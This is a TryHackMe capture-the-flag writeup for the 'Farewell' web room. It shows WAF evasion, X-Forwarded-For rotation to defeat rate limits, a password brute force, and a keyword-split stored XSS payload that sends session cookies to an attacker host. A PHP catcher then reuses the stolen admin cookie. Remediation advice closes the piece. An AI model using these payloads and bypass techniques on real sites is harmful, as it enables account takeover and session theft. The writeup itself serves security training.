# Farewell — TryHackMe Writeup

> **Difficulty:** Hard (MAX) · **Category:** Web / Red Teaming
> **Author of writeup:** 0xnyx
> **Goal:** Bypass the WAF and obtain admin access to the Farewell web app.

---

## Overview

Farewell is a web challenge built around a **WAF (Web Application Firewall)** that
protects a message-board style app. Users sign in, leave a final "farewell message",
and an admin reviews every submission from a separate admin panel.

Two flags:

| Flag | Where |
|------|-------|
| User flag | Dashboard, after logging in as a normal user |
| Admin flag | Admin panel, after reaching admin access |

The whole room is about **bypassing the WAF** — first its IP-based rate limiting, then
its content filter that blocks XSS payloads.

---

## 1. Reconnaissance

```bash
nmap -sVC -T4 -Pn <TARGET>
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set        <-- cookie readable from JavaScript
|_http-title: Farewell — Login
```

Key takeaways:
- Only SSH + HTTP are exposed.
- `PHPSESSID` has **no `HttpOnly` flag** → a successful XSS can read `document.cookie`.

---

## 2. Mapping the app

The login page loads `check.js`, which POSTs credentials to `/auth.php`:

```js
const res = await fetch('/auth.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: form.toString()           // username + password
});
// server returns JSON for both success and failure
if (data.user && data.user.password_hint) { showHint("Invalid password against the user"); }
```

Interesting: on a **failed** login the server still returns the target user object,
**including a `password_hint`** — a built-in username-enumeration + hint oracle.

### The WAF

Sending the request with `curl` returns a `403 — WAF is Active` page. The WAF fingerprints
non-browser traffic, so we add browser-like headers:

```bash
-H "User-Agent: Mozilla/5.0" \
-H "Referer: http://<TARGET>/" \
-H "Origin: http://<TARGET>" \
-H "X-Requested-With: XMLHttpRequest" \
-H "Content-Type: application/x-www-form-urlencoded"
```

With those headers a single request works:

```json
{"error":"auth_failed","user":{"name":"admin",
 "last_password_change":"2025-10-31 19:03:00",
 "password_hint":"the year plus a kind send-off"}}
```

### WAF rate limit

Firing requests in a loop quickly triggers the WAF again (~9 requests per window).
It keys the limit on the **client IP**, which the app trusts from `X-Forwarded-For`.
Rotating that header per request bypasses the rate limit entirely:

```bash
-H "X-Forwarded-For: 203.0.$RANDOM.$RANDOM"
```

---

## 3. User flag — targeted brute force

Valid usernames leak in the home-page ticker:

```html
<div class="tick-item">adam posted a message - 3 hrs ago</div>
<div class="tick-item">deliver11 posted a message - 4 hrs ago</div>
<div class="tick-item">nora posted a message - 1 day ago</div>
```

Querying each through the hint oracle:

| User | Hint |
|------|------|
| adam | favorite pet + 2 |
| **deliver11** | **Capital of Japan followed by 4 digits** |
| nora | lucky number 789 |

`deliver11` is cleanly brute-forceable: `Tokyo` + 4 digits = 10 000 candidates.
With `X-Forwarded-For` rotation the WAF rate-limit never kicks in:

```bash
# password candidates
seq -w 0 9999 | sed 's/^/Tokyo/' > tok.txt
# a matching list of random IPs for XFF rotation
seq 1 10000 | awk '{print "13."int(rand()*254)+1"."int(rand()*254)+1"."int(rand()*254)+1}' > ips.txt

ffuf -w tok.txt:PASS -w ips.txt:IP -mode pitchfork \
  -u http://<TARGET>/auth.php -X POST \
  -H "User-Agent: Mozilla/5.0" -H "Referer: http://<TARGET>/" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: IP" \
  -d "username=deliver11&password=PASS" \
  -fr "auth_failed" -t 30
```

Hit:

```
[Status: 200, Size: 45] PASS: Tokyo1010
```

Log in and read the dashboard:

```bash
curl -s -c cookies.txt -X POST http://<TARGET>/auth.php \
  -H "User-Agent: Mozilla/5.0" -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=deliver11" --data-urlencode "password=Tokyo1010"
# {"success":true,"redirect":"/dashboard.php"}

curl -s -b cookies.txt http://<TARGET>/dashboard.php | grep -oE 'THM\{[^}]*\}'
```

> **User flag:** ``

---

## 4. Admin flag — WAF-bypass stored XSS

The dashboard has a `farewell_message` form, and the story tells us the **admin reviews
every submission** from the admin panel (`/admin.php`, a separate password-protected page).
This is a classic **stored XSS → admin bot** setup.

First probe shows the WAF blocks obvious XSS:

| Payload | Result |
|---------|--------|
| normal text | 200 |
| `<script>…</script>` | 403 |
| `<ScRiPt>…` (case) | 403 |
| `<img src=x onerror=…>` | 403 |
| `<svg onload=…>` | 403 |
| **`<body onload=…>`** | **200** |
| `fetch` (keyword) | 403 |
| `document.cookie` (keyword) | 403 |

So `<body onload>` survives the tag filter, but `fetch` and `document.cookie` are blocked
as keywords. Break them with string concatenation:

```html
<body onload=window["fe"+"tch"]("http://<ATTACKER>:8000/?c="+document["coo"+"kie"])>
```

This payload returns **200** — it passes the WAF.

### Catcher that auto-uses the stolen cookie

Because sessions rotate quickly, the listener grabs the admin cookie and immediately
re-uses it against `/admin.php`:

```php
<?php
$qs = $_SERVER['QUERY_STRING'] ?? '';
if ($qs) {
    $sess = trim(str_replace("PHPSESSID=","",urldecode(preg_replace('/^c=/','',$qs))));
    $ctx = stream_context_create(['http'=>['header'=>
        "Cookie: PHPSESSID=$sess\r\nUser-Agent: Mozilla/5.0\r\nX-Forwarded-For: 13.9.9.9\r\n"]]);
    $r = @file_get_contents("http://<TARGET>/admin.php", false, $ctx);
    if (preg_match('/THM\{[^}]*\}/', $r, $m)) fwrite(STDERR, "\n[!!!] {$m[0]}\n");
}
echo "ok";
```

```bash
php -S 0.0.0.0:8000 catcher.php
```

### Fire it

Submit the payload as the farewell message (as deliver11):

```bash
curl -s -b cookies.txt \
  -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 13.5.5.5" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST http://<TARGET>/dashboard.php \
  --data-urlencode 'farewell_message=<body onload=window["fe"+"tch"]("http://<ATTACKER>:8000/?c="+document["coo"+"kie"])>'
```

When the admin reviews messages, the XSS fires in their browser, the catcher receives the
admin `PHPSESSID`, re-requests `/admin.php` and pulls the flag:

```
[+] ADMIN COOKIE: PHPSESSID=8tci42b4t70b43u9bqq5a75p6j
[!!!] 
```

> **Admin flag:** ``

---

## Lessons

- **`X-Forwarded-For` rotation** defeats an IP-based WAF rate limit when the app trusts that header.
- A login endpoint that returns a **password hint** is a username-enumeration oracle — use it to pick targeted, crackable users instead of running rockyou blindly.
- **WAF content-filter bypass:** replace a blocked tag with an allowed one (`<body onload>` instead of `<script>`/`<img onerror>`), and split blocked keywords with string concat (`window["fe"+"tch"]`, `document["coo"+"kie"]`).
- **Stored XSS + admin bot + `HttpOnly` off** = session theft; auto-using the stolen cookie beats fast-rotating sessions.

## Remediation

- Don't trust `X-Forwarded-For` for rate limiting; key on the real connection IP.
- Never return password hints or distinguish valid/invalid usernames in auth responses.
- Rate-limit and lock accounts on repeated failures.
- Output-encode user content; use a strict CSP; set `HttpOnly` (and `Secure`) on session cookies.
- A WAF is defense-in-depth, not a substitute for encoding and parameterization.
